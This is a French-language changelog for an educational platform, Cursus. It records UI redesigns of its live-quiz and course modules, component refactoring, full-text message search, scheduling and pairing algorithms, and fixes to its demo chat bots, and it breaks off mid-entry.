# Changelog

## v2.282.0 (2026-05-05)

### Refactor : decoupage TeacherLiveView en sous-composants

`TeacherLiveView.vue` faisait 3038 lignes (3000+) — un god component qui
melangeait : home accueil, sub-page categorie, session active, tous les
panneaux toggle, et 1700 lignes de CSS. Refactor en 5 composants.

**Composants extraits** (fichiers nouveaux, scoped CSS) :

- `LiveHomeHero.vue` — hero panel accueil (title display + halo pulse +
  stats pills + raccourci `?`). Props `stats`, emits `show-shortcuts`.
- `LiveCategoryGrid.vue` — grille des 4 cartes Spark/Pulse/Code/Board.
  Pas de prop (utilise `ACTIVITY_CATEGORIES` du utils), emit `select`.
- `LiveDraftsList.vue` — section "Brouillons a reprendre" (cards UiCard
  + actions resume/clone/delete). Props `drafts`, `draftActivityCount`,
  emits `resume`, `clone`, `delete`.
- `LiveTemplatesList.vue` — section "Modeles enregistres" (cards radius
  lg + barre live-red sticky-left + load/delete). Props `templates`,
  emits `load`, `delete`.
- `LiveCategoryDetail.vue` — sub-page detail apres clic carte categorie
  (header hero gradient + types grid + features grid + create panel
  CTA gradient). Props `category` + `modelValue` (v-model titre) +
  `loading`, emits `back`, `create`.

**Bilan TeacherLiveView** :

- Avant : 3038 lignes (template ~700, CSS ~1700).
- Apres : **2653 lignes** (-385 lignes / -12.7%).
- Imports nettoyes (Sparkles, FileText, Bookmark, PencilLine, UiCard,
  relativeTime retires car dorenavant dans les sous-composants).

Bonus : chaque composant a son CSS scoped — fini les classes globales
qui leakent. Et chaque sous-composant peut maintenant evoluer
independamment (ex: tester un nouveau hero sans toucher au reste).

Build + tsc verts. Aucun changement comportemental, refactor pur.

## v2.281.0 (2026-05-05)

### Live polish — sub-page categorie + mode projection

Suite v2.279/280, focus sur les 2 ecrans qui restaient flat : la
sub-page "Categorie detail" (apres clic sur une carte categorie) et le
LivePresentationMode (mode plein ecran videoprojecteur).

**Sub-page categorie (`.live-cat-detail`)** :

- Header refondu en hero panel : padding 28x32, radial gradient cat-color
  + dot pattern signature landing, barre 3px sticky top.
- Icone 72x72 gradient solide cat-color + box-shadow tinte (etait 56x56
  tint plat).
- Title 32px display / -0.03em / line-height 1.1 (etait 22px / pas de
  letter-spacing).
- Desc 15px secondary (etait 13px muted).
- Section titles 18px display -0.02em (etaient 12px uppercase).
- Type cards : radius lg + hover lift -1px + glow tinte. Icone 32x32
  pastille tinted (etait icon flat).
- Features grid 2-col + check icon en pastille gradient cat-color (etait
  liste verticale + dot 6px).
- Create panel : panneau gradient + barre sticky top + CTA gradient
  pleine largeur avec halo box-shadow + lift hover (etait flat).
- Mobile : header stack vertical sous 600px.

**LivePresentationMode (mode projection plein ecran)** :

- Background : multi-layer radial (cat 22% + cat 14% + dot pattern 32px
  + vignette top) — alignement signature `.hero` landing dramatique
  (etait double radial simple).
- Join panel : QR avec border 4px white (scan reliable), gradient cat
  glassmorphism, code 28px / letter-spacing 4px + text-shadow halo
  cat-color (etait 22px / 2px sans halo). Label uppercase tracking.
- Type chip : box-shadow halo 28px cat-color (etait juste tinte plat).
- Title : `clamp(36-76px)` / `-0.03em` / `line-height 1.05` + text-shadow
  ombre profonde (etait 28-62px / -0.015em / 1.15).
- Footer : panneau glassmorphism radius lg avec border subtle.
- **Live indicator dot** signature : pastille cat-color 10px avec pulse
  expand 1.6s autour du compteur de reponses. Pattern recording-light
  (Wooclap / Mentimeter / OBS).
- Stat number 44px / -0.02em (etait 36px / pas letter-spacing).
- Stat label uppercase tracking 0.06em (etait pas tracked).
- Confusion stat : pill tokenise avec border (etait juste color).

Reduced-motion respecte sur live-pulse, lpm-in, lpm-pulse-warn.

## v2.280.0 (2026-05-05)

### Live polish session — activity cards + panels + buttons

Suite de la refonte v2.279, focus sur la session active : la liste
d'activites, les panneaux toggle (Spark mode / Self-paced) et les
boutons d'action sont alignes sur le langage moderne.

**Activity cards (etait flat row + barre hover-only)** :

- Radius `--radius-lg` 20px (etait `--radius` 12px).
- Barre coloree 4px sticky-left **permanente** (etait hover-only) avec
  thickness 5px au hover.
- Icone 42x42 **gradient solide** par categorie (etait soft tint plat) +
  box-shadow tinte + spring rotate -2deg au hover.
- Hover lift -2px + box-shadow 24px tinte categorie (etait juste change
  de border-color).
- Focus-within ring tinte, accessibilite clavier.

**Activity-card-done badge** :

- Pill 999px tinte CTA emerald + bordure (etait carre vert flat).

**btn-launch (par activite)** :

- Aligne CTA emerald `var(--cta)` + halo box-shadow + micro-lift -1px
  (etait `#22c55e` hardcode + filter brightness).

**btn-launch-all (mode self-paced)** :

- Garde gradient signature blue→pulse (multi-categorie) mais ajoute
  halo box-shadow tinte + micro-lift au hover.

**Self-paced panel** :

- Radius lg + radial gradient indigo subtle + barre 2px sticky top
  accent (etait flat var(--bg-elevated)).
- `.sp-all-launched` passe en pill tinted pulse.

**Spark mode panel** :

- Radial gradient spark coin top-right + barre 3px sticky top spark
  (etait gradient lineaire transparent simple).

**Templates list** :

- Cards radius `--radius-lg` (etait sm), barre 3px live-red sticky-left,
  hover lift -2px + glow tinte (etait juste border-color change).
- Title 14px / -0.01em, "Utiliser" pill 999px (etait 11px carre).
- Bouton supprimer ghost-style avec hover danger.

**Session meta bar** :

- Participant bar pill 999px tinte live-red (etait rect plat gris).
- Confusion counter pill 999px tokenise (etait `#fef3c7` hardcode).

Reduced-motion respecte sur tous les nouveaux mouvements (lift, rotate,
glow). TypeScript build vert.

## v2.279.0 (2026-05-05)

### Refonte design Live — Accueil moderne (signature landing)

Le user a flag "c'est moche" sur l'accueil Live. Refonte visuelle des 3
ecrans cles : hero, 4 cartes de categories, header session.

**Hero accueil Live (auparavant : icone 22px + titre 22px plat)** :

- Triple radial gradient (indigo + live-red + dot pattern) qui matche
  exactement la signature `.hero` de la landing.
- Icone 76x76 avec gradient live-red + halo pulse 2.4s anime (alignement
  signature `stat-online-dot`).
- Titre display 36px / letter-spacing -0.03em / line-height 1.05
  (signature `.hero-headline` landing). Badge "Beta" pill cote droit.
- Tagline 15px secondary "Quiz, sondages, code en direct..." pour
  positionner immediatement.
- Stats row pills 999px avec accent live-red sur brouillons.

**4 Categories cards (auparavant : tiles 22px padding plates)** :

- Carre 28px padding, radius `--radius-bento` 24px (signature .bento-card
  landing).
- Glow radial 60% top-right en `--cat-color`, opacity 0.6 -> 1 au hover
  + scale 1.15.
- Barre 3px sticky top en gradient cat-color (visible permanente).
- Icone 64x64 gradient cat-color + box-shadow tinte (rotate -3deg + scale
  1.06 au hover, easing spring).
- Title 20px / -0.02em (etait 16px / -0.1px).
- Types pills tinted dans la cat-color (etait grises).
- CTA pill "Creer →" en bas a droite, slide-in 8px au hover.
- Hover lift -4px + shadow 18-40px tinte cat-color.

**Section titles** :

- Display 22px / letter-spacing -0.03em / line-height 1.15 (etait 14px
  flat). Sous-titre optionnel pour densifier le contexte.
- Count badge live-red tinte (etait gris neutre).

**Session header (when in session)** :

- Panneau radial gradient + barre 3px live-red sticky top.
- Title 28px display landing-style (-0.03em).
- Pills cat 999px + border (etaient carrees).
- `.btn-start` aligne CTA emerald `var(--cta)` au lieu de `#22c55e`
  hardcode + halo box-shadow + micro-lift -1px (signature .nav-cta).

Reduced-motion respecte sur tous les nouveaux elements (pulse, glow,
slide-in CTA).

## v2.278.0 (2026-05-05)

### Uniformisation continue : radius + display typography landing-aligned

Suite des refontes design v2.274/275/276/277, focus sur l'alignement des
tokens de forme (radius) et de la typographie display avec la landing.

**Radius tokens** :

- `--radius-lg` 16 → 20 (matche `--r-md: 20px` landing). Affecte cards,
  modals, surfaces moyennes — ~63 fichiers reprennent automatiquement
  cette valeur (UiCard, modals, sidebars, badges containers).
- Nouveau token `--radius-bento: 24px` qui matche le radius des
  `.bento-card` landing. Reserve aux widgets dashboard.
- `--radius-xl` 24 → 28 (matche `--r-lg: 28px` landing).
- `--radius-2xl` 28 → 32 pour rester un cran au-dessus.

**Application bento** : `WidgetShell.vue` propage `--radius-bento` aux
UiCard internes via `:deep(.ui-card)` selector. Les widgets bento ont
desormais le radius signature 24px de la landing, le UiCard generique
(modals, listes) reste a 20px.

**Display typography (signature .hero-headline landing)** :

- `letter-spacing: -0.03em` (etait -0.01 / -0.02 selon endroits)
- `line-height: 1.15` (etait 1.2)

Applique a :

- `.db-title` (header dashboard prof + etudiant) — dashboard-shared.css
- `.hero-title` (StudentLiveView empty state)
- `.lw-title` (LumenWelcome empty state)
- `.auth-brand-name` (LoginOverlay)

Les hero/headers font desormais "claquer" la signature serree et resserree
qu'on voit sur la landing — meme caractere editorial que Substack/Stripe.

## v2.277.0 (2026-05-04)

### Live — polish 3 phases (6.5 -> 8+)

Audit honnete livre 6.5/10 sur le module Live. Trois phases de polish
livrees ensemble : accessibilite, real-time feedback, signature visuelle.

**Phase 1 — Accessibility & friction**

- **CountdownTimer** : `role="timer"`, `aria-label`, `aria-live="polite"`
  (assertive sous 5s) pour les screen readers. Animation pulse bypass via
  `prefers-reduced-motion`. Ajout breakpoint mobile (timer 84px au lieu de
  120px). Fix l'absence d'announcement WCAG du temps restant.
- **Empty state etudiant en attente** : refonte de l'ecran "3 dots". Icone
  hourglass dans cercle accent + ring pulse + titre rassurant + tip.
  L'attente devient narrative au lieu d'un ecran vide. Cf. Wooclap /
  Mentimeter.

**Phase 2 — Real-time feedback signature**

- **Leaderboard pulse on score** : quand un etudiant marque ce round
  (`pointsThisRound > 0`), sa ligne fait un pulse vert 1s + scale(1.02)
  + glow ring. Cf. Wooclap / Mentimeter qui font remonter visuellement
  les nouvelles reponses. Le `recentlyScored` Set tracke les ids touches.
- **Replay mode distinction** : en mode entrainement, banniere
  `<RotateCw> Mode entrainement — tu refais cette session en solo, les
  resultats restent locaux.` + tint de fond accent subtile. Evite la
  confusion "j'ai eu juste mais c'etait la mauvaise reponse au moment du
  live".
- **JoinCodeDisplay stagger** : QR code et URL share apparaissent en
  fade-up apres le pop des chars du code, avec delai dynamique calcule
  sur la longueur du code. Plus de saccade entre les elements.
- **LiveCodeEditor halo** : border `var(--live-code)` permanent + halo
  pulse 2.4s (`box-shadow` ring). Signale "tu diffuses en direct" meme
  quand le badge `Diffusion en direct` est hors viewport.

**Phase 3 — Polish accessibilite**

- **WordCloud** : rotation deterministe via hash du texte (etait
  `Math.random()` qui re-randomisait a chaque render = mots qui sautent),
  amplitude reduite -4°/+4° (etait -10/+10) pour respect dyslexie.
  `prefers-reduced-motion` desactive la rotation. Cf. WCAG 2.1.
- **Podium confetti** : positions/delais figes au mount via `computed`
  (etait `Math.random()` inline dans template). `aria-hidden="true"` sur
  le container. `prefers-reduced-motion` masque les confettis et le
  podium-rise. L'info reste lisible sans animation.
- **Drag-drop affordance** : `cursor: grab` sur card draggable et
  `grabbing` au :active. L'utilisateur sait que la card se reordonne meme
  avant de chercher le grip-handle.
- **Focus-visible color-live** : focus ring teinte `var(--color-live)`
  partout dans TeacherLiveView (au lieu de l'accent indigo qui se
  confondait avec les chips colorees).

## v2.276.0 (2026-05-04)

### Lumen — Phase 4 polish editorial (7.5 -> 8.5+)

Apres la refonte v2.275 (typographie unifiee, layout, polish basics), cette
version pousse Lumen vers le territoire Stripe Docs / Substack / Notion.

**Reading progress bar** : barre fine de 2px sous le breadcrumb, scaleX
driven par le scroll du body. Visible uniquement quand le chapitre a du
contenu scrollable (>0% et <100%). Signature editorial classique
(Medium, Substack) qui rassure l'utilisateur sur la longueur restante.

**Heading anchor links** : au hover d'un h1-h6, un "#" apparait a droite
du titre. Click = copie l'URL `lumen://repo/path#heading-id` dans le
presse-papiers. Permet de partager un deep-link vers une section precise.
Pattern GitHub README / MDN / Stripe docs.

**Header dropdown menu (...)** : les actions secondaires Print et
Copy-link sont regroupees sous un bouton ⋮ qui ouvre un popover propre.
Allege visuellement le header pour focaliser l'oeil sur les actions
primaires (Edit, Companion, Devoirs). Mode Exec ipynb reste en chip
dedie car c'est un toggle de mode (etat persistant). Click-outside et
Escape pour fermer le menu.

**Image lightbox** : click sur une image markdown ouvre un overlay plein
ecran avec backdrop-blur. Escape ou click-hors-image pour fermer.
Cursor: zoom-in sur les images, zoom-out sur l'overlay. Pattern Notion /
GitHub README. Teleporte sur body pour eviter les conflits de stacking
context.

**Pull-quote variant** : `<blockquote class="pull-quote">` rend une
citation centree, grande (1.4em), avec guillemet decoratif accent au
dessus. Permet la mise en exergue editorial style Substack / NYT /
Atlantic. Activable via HTML inline dans le markdown.

**Drop-cap automatique** : le premier paragraphe qui suit un h1 commence
par une grande capitale flottante (3.4em, accent color). Detail
typographique signature editoriale, visible sans configuration. Cf.
Substack, Atlantic, Le Monde.

**Cleanup** : suppression des references restantes au reading-light
toggle dans les classes (deja retire du JS en v2.275 mais 2 :class=
restaient). Print stylesheet etendu pour masquer les nouveaux elements
(reading-progress, heading-anchor, lightbox).

## v2.275.0 (2026-05-04)

### Refonte design Lumen — voix editoriale unifiee

Audit honnete du module Lumen (cours markdown) : **5.5/10 avant, 7.5/10 apres**.
Trois phases livrees ensemble (P1 quick wins, P2 layout refonte, P3 polish).

**Phase 1 — Quick wins** :

- **Voix typographique unique** : suppression du bloc CSS dupliquant 15px
  sans-serif dans `LumenChapterViewer.vue` qui se battait avec le bloc 17px
  Newsreader serif de `LumenView.vue`. Le viewer parle desormais d'une
  seule voix editoriale (Newsreader 17px / line-height 1.72 / serif). Le
  bloc style global de `LumenView.vue` est supprime, tout vit dans le
  composant viewer.
- **Largeur de lecture sous controle** : `.lumen-viewer-body` plafonne a
  760px (~70-75 caracteres en 17px serif) sur tous les ecrans, au lieu
  d'un `max-width: 100%` qui s'activait sous 1400px et laissait des
  lignes a 150 chars sur 13" laptop. Padding adapte par breakpoints
  (56 / 32 / 20 px).
- **Admonitions reparees** : le HTML genere par `utils/markdown.ts`
  utilise les classes `lumen-adm-note/tip/warning/danger`, mais le CSS
  ciblait `lumen-admonition--note/tip/...`. Les variantes colorees ne
  s'affichaient donc pas. Header (icone + titre "Note", "Astuce", etc.)
  desormais visible et stylise par variante.
- **Floating nav prev/next** : opacity 0.4 → 0.65 par defaut, 1.0 au
  hover. Les boutons etaient quasi invisibles sur fond clair.

**Phase 2 — Layout refonte** :

- **Notes panel masque sous 1200px** : sous ce seuil, outline (220) +
  notes (320) + body 760 = 1300px de largeur necessaire. On hide le
  panneau pour rendre la lecture prioritaire. Cf. Notion qui hide la
  sidebar a <1000px. Le contenu des notes reste persiste, juste non
  visible — l'etudiant retrouve ses notes des qu'il elargit la fenetre.
- **Outline header touch target 44px** : auparavant 30x30px (toggle
  inadapte tactile). Full-width clickable, hover bg, focus ring inset.
- **Breadcrumb hierarchise** : projet (link, muted) → section (italique,
  secondary) → chapitre courant (bold 16px, primary). Trois niveaux
  visuellement distincts au lieu de trois `<span>` identiques.
- **Header chapitre allege** : chips secondaires (Print, Copy-link, Exec)
  passent en style ghost minimal (icone + halo discret, sans bordure).
  L'oeil se pose sur les actions primaires (Edit / Companion / Devoirs).

**Phase 3 — Polish** :

- **Code blocks fade-right** : mask-image lineaire signale "scroll
  horizontal possible" sur les lignes longues. Sans cet indicateur, les
  utilisateurs ignoraient le contenu cache a droite.
- **Focus ring textarea notes** : `box-shadow: inset 2px accent` quand le
  textarea est focus. Plus de flou visuel sur fond sombre.
- **Inputs modal "Nouveau cours"** : 14px / padding 12px (etait 13/10,
  ressemblait a du placeholder). Standard Stripe/Linear.
- **Stale banner et fin de cours** : centres avec max-width 760px pour
  rester dans la colonne de lecture. Tokens `--color-warning-rgb` /
  `--color-success-rgb` au lieu d'rgb hardcodes.
- **Reading-light toggle retire** : il dupliquait le theme switch global
  via `!important` hardcodes qui cassaient le tokenisme. Si l'etudiant
  veut un mode clair, il switch le theme app (Settings → Apparence).

## v2.274.0 (2026-05-04)

### Alignement CTA app sur la landing — emerald

Audit design app vs landing : la landing utilise **emerald** (`#059669`
light / `#34D399` dark) pour ses CTA principaux (`.nav-cta`, `.btn-accent`),
alors que l'app utilisait **indigo** (`--accent`) sur tous les boutons
d'action. L'app n'avait donc aucun signal visuel fort pour les "actions de
conversion" (Submit, Save, Confirmer, Creer, Envoyer, Deposer).

**Tokens & classe nouvelle** (`base.css`, `components.css`) :

- `--cta` / `--cta-hover` / `--cta-dark` / `--cta-rgb` / `--cta-subtle`,
  ajoutes en light + dark.
- `.btn-cta` : meme structure que `.btn-primary` mais sur la palette emerald,
  avec micro-lift -1px et halo emerald au hover.
- `UiButton` : nouvelle variante `cta` (`<UiButton variant="cta">`).

**Boutons convertis** (~40 fichiers) — tous les boutons "commit / create /
submit / save / send / deposit / confirm" sont passes en emerald :

- **Modals** : Create*Modal (Channel, Poll, Promo, Math, Date, Code,
  Checklist, Table, Announce), New*Modal (Travail), Import/Change/Suivi/
  Rubric/Ressources/Intervenants/Depots/Document, Lumen, GestionDevoir.
- **Devoirs** : DepositForm "Soumettre", StudentDevoirCard "Deposer",
  TeacherProjectHome "Creer un devoir", DevoirsHeader "Nouveau devoir",
  StudentProjetDevoirsList submit, TeacherRendusView save grade.
- **Documents** : `DocumentsView`/`DocumentsEmptyState` "Ajouter",
  `DocumentAddModal`/`DocumentEditModal` submit, MessagesView doc-drop.
- **Booking** : BookingFlow "Confirmer le rendez-vous", TabBooking
  "Nouveau type", TabBookingAvailability "Enregistrer", TabBookingEventTypes
  "Nouveau type" + "Creer", CampaignManager "Nouvelle campagne" + "Lancer".
- **Suivi etudiants** : "Nouvelle note" + submit + premiere note.
- **Settings** : "Generer lien Outlook", "Connecter GitHub", "Connecter MS".
- **Onboarding** : OnboardingWizard.ob-btn-primary, DemoOnboardingTour.
- **Send messages** : `#btn-send` du chat (action haute frequence).
- **App.vue** : "J'ai compris" privacy.

**Garde indigo `--accent`** : actions secondaires (Annuler, Fermer,
navigation, copy URL, retry, download). Les boutons danger restent
`btn-danger`. Le `MessageReportDialog` "Envoyer le signalement" passe
explicitement en `btn-danger` (action de moderation).

**Scopes locaux mis a jour** : `cmt-/cdt-/ccd-/ccl-/ctm-/can-/ob-/onb-`
btn-primary, `bf-btn-primary`, `btn-primary-sm` (ProjectListPanel) :
toutes les declarations `background: var(--accent)` repointees sur
`var(--cta)` + hover `var(--cta-hover)`.

Resultat : l'app respire le meme langage visuel que la landing, avec une
hierarchie d'action lisible (emerald = "go" / indigo = "interact").

## v2.271.0 (2026-04-30)

### Fix demo : envoi messages + visibilite bots + notifs riches

**Fix : impossible d'envoyer un message en demo** (`useMsgSend.ts`).

`isOfflineOrDisconnected` retournait `true` en demo parce que socket.io
n'est volontairement pas connecte (cf. api-shim.ts ligne 376). Le bouton
d'envoi etait donc desactive et un toast "Hors-ligne - message non envoye"
s'affichait. Fix : en demo, on ignore `socketConnected` puisque l'envoi
passe par REST `/api/demo/messages`.

**Fix : "X est en train d'ecrire" sans message qui suit**
(`useDemoMessagesPoll.ts`).

Le serveur demoBots pose un flag typing 2.5s avant d'inserer le message
bot. Le frontend voyait l'indicateur typing (poll 1.5s) mais les messages
inseres en arriere-plan ne remontaient jamais dans la vue chat (pas de
socket.io en demo, pas de poll messages). Fix : nouveau composable
`useDemoMessagesPoll` qui poll le canal/DM actif toutes les 10s et
upsert les nouveaux messages (id > max courant). Pas de set
loading=true, pas de remplacement de l'array : just append, zero flicker.

**Refonte notifications demo** (`DemoNotificationStack.vue` +
`useDemoNotifications.ts` v4).

Avant : un toast text plat "Sara - #algo : ton message" pour CHAQUE
message bot du tick, avec spam si plusieurs bots parlaient en meme temps,
et aucune action possible.

Apres :

- **Filtrage relevance** : on ne notifie QUE pour les DMs entrants et
  les @mentions du visiteur. Les messages canaux ordinaires ne genere
  plus de toast (ils restent visibles dans le chat via le poll).
- **Design moderne** : pile de cartes 360px en haut a droite, max 3
  visibles, avatar colore avec initiales, badge type (DM violet /
  mention orange / canal gris), preview message clamp 2 lignes,
  progress bar bas qui rapetisse en 8s, pause au hover, slide-in droite.
- **Boutons d'action** : "Voir le message" (primaire, ouvre le canal/DM
  correspondant via router) + "Ignorer" (ghost) + croix de fermeture.
- **Origine claire** : icone + texte "Message direct" / "Mention dans
  #channel" / "#channel" — le visiteur sait IMMEDIATEMENT d'ou ca vient.

Bump 2.270.0 -> 2.271.0.

## v2.270.0 (2026-04-30)

### Landing page : 4 nouvelles sections + cleanup naming/accents

**4 nouvelles sections sur src/landing/index.html** pour debloquer les
personas direction d'ecole + prof curieux qui n'etaient pas servis :

- **Bandeau "Securite & souverainete"** apres le hero : 4 cartes
  compactes (AES-256-GCM, hebergement Hostinger France, AGPL auditable,
  auto-hebergeable). Argument debloquant pour les directions pedagogiques.
- **Section "Cas d'usage"** apres les features : 3 scenarios concrets
  (cours magistral d'algo, projet de groupe, semaine de soutenances)
  avec timeline + outils remplaces. Ancre les fonctionnalites dans la
  realite d'un prof.
- **Tableau comparatif** Cursus vs Moodle / Teams / Outlook : 9 lignes
  avec marqueurs +/~/- et notes contextuelles. Honnete : montre aussi
  les trous Cursus (visio amphi >100p, SSO LDAP).
- **Roadmap publique** entre FAQ et Download : 3 colonnes Recent
  (avr. 26) / En cours (mai-juin) / A venir, basee sur le vrai
  CHANGELOG. Signal "produit vivant" sans fake metrics.

**Cleanup naming user-facing** (suite des commits 4a9b3e7 + 399eed05) :

- Lumen -> Cours (meta SEO, bento card, feature 7, demo title, JS LIVE_TITLES)
- Spark / Pulse -> Quiz / Sondage (feature 4 Live, audience prof)
- Ressources (titre vitrine) -> Documents
- Footer column "Ressources" -> "Liens"

**Passe d'accents** sur le contenu visible et indexe Google :
meta descriptions, JSON-LD, Decouvrir, Disponibilites, creneaux,
coup d'oeil, pedagogique, integree, pensee, etudiants.

**Hero CTA reduit a 1 primaire** : "Tester en demo - 30 s, sans
inscription". Les CTAs concurrents "Ouvrir l'app" et "Telecharger"
descendent en lien discret en-dessous ("Deja inscrit ? Se connecter -
Telecharger l'app"). Reduit la friction du choix.

**Proof bar amelioree** : remplacement de "Hebergee en France - donnees
demo effacees 24h" (melange prod + demo) par "Hebergee en France - DM
chiffres AES-256-GCM" + "Auto-hebergeable - AGPL v3".

**Nav** : ajout de Cas d'usage, Comparatif, Roadmap. Retire Pour qui
et Telecharger du desktop nav (toujours dispos en mobile menu et footer).

Bump 2.269.0 -> 2.270.0.

## v2.267.0 (2026-04-28)

### Marketing depot + DX + Nudge starter + bug fixes prod

**README v2 - touches DX**.
- CTA "Tester la demo live" remonte au-dessus du fold, format proeminent
- Section "Captures" avec placeholders pour 7 GIFs/screenshots a inserer
- Fix oxymore : "DMs chiffres bout-en-bout au repos" -> "chiffres AES-256-GCM
  au repos en base" (correction technique, AES-GCM avec cle serveur n'est
  pas E2EE)
- Section Architecture & Scaling ajoutee : choix single-tenant explique,
  WAL mode SQLite, prereq build natif better-sqlite3 par OS

**ARCHITECTURE.md complet** : 7 choix de design documentes (single-tenant,
WAL, better-sqlite3, schema versionne, DMs chiffres, JWT stateless, Vue3),
sentinelles operationnelles, points d'amelioration connus.

**scripts/seed.js + npm run seed**. Plus besoin de cliquer dans l'admin
pour peupler une DB de dev. `npm run seed` cree :
- 1 promo "Licence Informatique L3 (Dev)"
- 1 admin (admin@cursus.dev / Admin1234!)
- 1 prof  (prof@cursus.dev / Prof1234!)
- 1 etudiant (etudiant@cursus.dev / Etudiant1234!)
- 3 canaux + 6 messages d'exemple
- 1 cours Lumen factice
Idempotent (insert or ignore par email/nom). `npm run seed:reset` purge
les donnees de dev avant insert si besoin.

**.gitignore enrichi**. Ignore desormais :
- `.claude/` (memoire IDE locale, jamais commite)
- `cursus.db*`, `data/cursus*.sqlite*` (bases de dev/test locales)
- `test-results/`, `playwright-report/` (artefacts E2E)
- `backups/` (snapshots auto serveur)

**Nudge anti-gruyere RDV (starter)**. server/db/models/bookingSlotScoring.js
implemente l'algorithme #1 propose dans la roadmap recherche-op : score
chaque creneau libre selon sa contiguite avec les RDV existants. +5
adjacent, +2 meme demi-journee, -3 cree un trou de 30min, -1 seul dans
la journee. Renvoie aussi un score normalise [0..1] pour l'UI. Wire
frontend a faire en suivant.

**Fix bugs prod**. Defensive guards ajoutes sur 3 sites :
- _loadNotifications : verif Array.isArray sur le JSON parse de localStorage
  (catch un cc_notifications corrompu)
- WidgetMessages : Array.isArray(notificationHistory) avant for...of
  (corrige "n.value is not iterable")
- ResizeObserver : useWidgetGrid duck-type via offsetWidth (corrige
  les fixtures de tests cassees + les composant Vue passes en ref)

Bump 2.266.0 -> 2.267.0.

## v2.266.0 (2026-04-28)

### Recherche FTS5 sur messages + fix tests useWidgetGrid

**FTS5 + BM25 sur la recherche messages** (`server/db/schema.js` v86,
`server/db/models/messages.js`).

Avant : `searchMessages` faisait `WHERE content LIKE '%q%'` -> O(n) sur
toute la table. Inutilisable au-dela de ~100k messages.

Apres : index inverse FTS5 + ranking BM25, requetes en O(log n).
- Migration v86 : `CREATE VIRTUAL TABLE messages_fts USING fts5(...)`
  avec tokenize='unicode61 remove_diacritics 2' (matche les accents
  francais : "regle" trouve "regle" et "règle")
- Backfill auto : INSERT SELECT depuis messages au boot post-migration
- Triggers AFTER INSERT/UPDATE/DELETE qui maintiennent l'index sync
  (DM exclus pour confidentialite, soft-deletes retires de l'index)
- buildFtsQuery() sanitize la query user : retire chars speciaux,
  ajoute prefix-matching `*` -> "algo" trouve "algorithme"
- Refacto searchMessages + searchAllMessages (partie canal) pour
  utiliser MATCH + bm25() au lieu de LIKE. Ranking par pertinence,
  plus par date.
- Fallback LIKE pour query 1-char (FTS5 n'aime pas les tokens < 2 chars)
- Fallback LIKE si FTS5 jette (query mal formee post-sanitize)

**Tests** : 15 nouveaux dans `tests/backend/db/messages-fts.test.js` :
trigger AFTER INSERT/DELETE/UPDATE, prefix-matching, accents, BM25
ranking, isolation par channel, securite (chars speciaux). Total
backend : 1663 -> 1678.

**DM non-indexes (securite)**. Le contenu des DMs est chiffre AES-256-GCM
en DB. Les indexer en FTS casserait la confidentialite. La recherche DM
reste sur le path "decryption en memoire puis filter" (cf.
searchDmMessages, inchange).

**Fix useWidgetGrid (regression v2.265 sur tests)**. Mes gardes
`instanceof HTMLElement` rejetaient les fixtures de test
`{ offsetWidth: 1200 } as HTMLElement`. resolveEl() utilise maintenant
duck-typing (objet avec offsetWidth: number) en plus du strict instanceof
+ unwrap $el. 15 tests useWidgetGrid passent a nouveau.

Bump 2.265.0 -> 2.266.0.

## v2.265.0 (2026-04-28)

### Recherche operationnelle : Hungarian + Scheduler + bug fixes

**Hungarian / Kuhn-Munkres** (`src/renderer/src/utils/optimization/hungarian.ts`).
Implementation O(n^3) du probleme d'affectation (workers x tasks). Pour
n=20 : ~30µs ; n=100 : ~1ms. Utilise pour suggerer des binomes de
projet en minimisant un cout de compatibilite (niveau, genre, anciens
binomes, exclusions).

Helper `pairStudents(students, costFn)` : matching biparti symetrique,
gere le cas impair (1 etudiant isole) automatiquement. Exposable cote
prof via le composable `useTeamMatcher`.

**Scheduler de soutenances** (`src/renderer/src/utils/optimization/scheduler.ts`).
CSP avec backtracking + heuristiques MRV (most-constrained variable
first) + LCV (least-constraining value first). Pour 30 etudiants /
4 jurys / 20 slots, converge en < 100ms. Contraintes supportees :
- Disponibilites de chaque jury par slot
- Capacite des salles par slot
- Slots interdits par etudiant
- Jurys preferes par etudiant
- Cout des jurys (favorise les internes vs externes)
- jurySize configurable (binome/trinome/etc.)

Helper `generateSlots(start, end, durationMin, opts)` : genere une grille
reguliere en sautant weekend / dejeuner / hors-heures de bureau.

**Tests** : 23 tests (`tests/frontend/utils/{hungarian,scheduler}.test.ts`),
incluant verification d'optimalite par enumeration brute pour n <= 6.
Total tests projet : 561 frontend (avant : 538).

**Bug fixes critiques** (rapportes par utilisateur en production) :
- `ResizeObserver: Argument 1 does not implement Element` : `useWidgetGrid`
  resoud maintenant la ref vers le DOM via `$el` ou `el` si c'est une
  instance de composant Vue (cas VueDraggable).
- `TypeError: ke.slice is not a function` (WidgetLumenNotes) : garde
  defensif `Array.isArray` avant slice/sort sur `resp.data.notes`.
- `TypeError: n.value is not iterable` (WidgetLumenTopRead, TypeRace) :
  garde defensif sur counts/history avant spread/iteration.
- Favicon obsolete : `src/web/public/assets/icon-192.png` synchronise
  avec icon-512 (qui correspond au nouveau logo).

Bump 2.264.0 -> 2.265.0.

## v2.264.0 (2026-04-28)

### Demo : grammaire CFG complete pour generation de messages coherents

Avant : Markov bigrammes sur 15 messages -> phrases courtes mais parfois
bancales. Apres : grammaire context-free avec 6 intentions, ~30 templates,
~150 lemmes -> milliers de phrases combinatoires plausibles, partagee
entre les bots serveur et le chat de la landing.

**Nouvelle grammaire** (`server/services/demoGrammar.js`) :

6 intentions phrastiques :
- ANNOUNCE  : annonce/rappel ("Le livrable est a rendre vendredi 17h")
- QUESTION  : question technique ("Quelqu un a deja vu CORS avec credentials ?")
- STATUS    : update progression ("J ai pushe la PR auth")
- HELP      : demande bloquante ("Je bloque sur la rotation double AVL")
- ACK       : ack court ("ok", "+1", "merci")
- REPLY     : reponse @mention ("@Sara carrement, je teste")

Vocabulaire centre projet web E4 + algorithmique + workflow dev :
- ARTIFACT : "le projet web E4", "la PR auth", "le rapport de stage"...
- ARTIFACT_TECH : "la branche main", "le hook useAuth", "le middleware JWT"...
- TOPIC : "la rotation double AVL", "argon2 vs bcrypt", "JWT refresh token"...
- VERB_ACTION : "implementer", "deployer", "refactor"...
- ERROR : "le build plante en npm install", "CORS rejette les credentials"...
- DAY/TIME/ROOM/TOOL/STATUS/FILLER...

Generator avec PRNG injectable (Math.random par defaut, custom pour
tests). Substitution recursive limitee a 10 niveaux (anti-cycle).
Cleanup automatique : majuscule en debut, ponctuation finale.

**Wire** :
- `server/services/demoBots.js` : 40% des posts spontanes utilisent la
  CFG (intention selon le canal — STATUS pour dev-web, QUESTION pour
  algo, ANNOUNCE pour general). Les 60% restants gardent les pools
